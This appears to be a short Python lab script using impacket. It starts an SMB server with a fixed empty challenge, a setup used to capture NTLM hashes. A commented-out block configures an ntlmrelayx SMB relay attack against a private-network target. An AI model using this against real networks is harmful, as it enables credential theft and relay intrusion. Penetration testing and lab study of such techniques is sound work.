#!/usr/bin/env python3

from impacket.smbserver import SimpleSMBServer
#from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
#from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
#from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
#from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
#from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
#
#attacks = {"SMB": SMBAttack}
#clients = {"SMB": SMBRelayClient}
#
#target = TargetsProcessor(
#    singleTarget="192.168.253.129",
#    protocolClients=clients,
#)
#config = NTLMRelayxConfig()
#
#config.setMode("RELAY")
#config.target = target
#config.setAttacks(attacks)
#config.setProtocolClients(clients)
#config.setSMB2Support(True)
#config.setInterfaceIp("1")
#config.setIPv6(True)
#
#server = SMBRelayServer(config)
#server.daemon = True
#server.start()
#server.join()
server = SimpleSMBServer("192.168.253.135", 445)
server.setSMBChallenge("")
server.start()
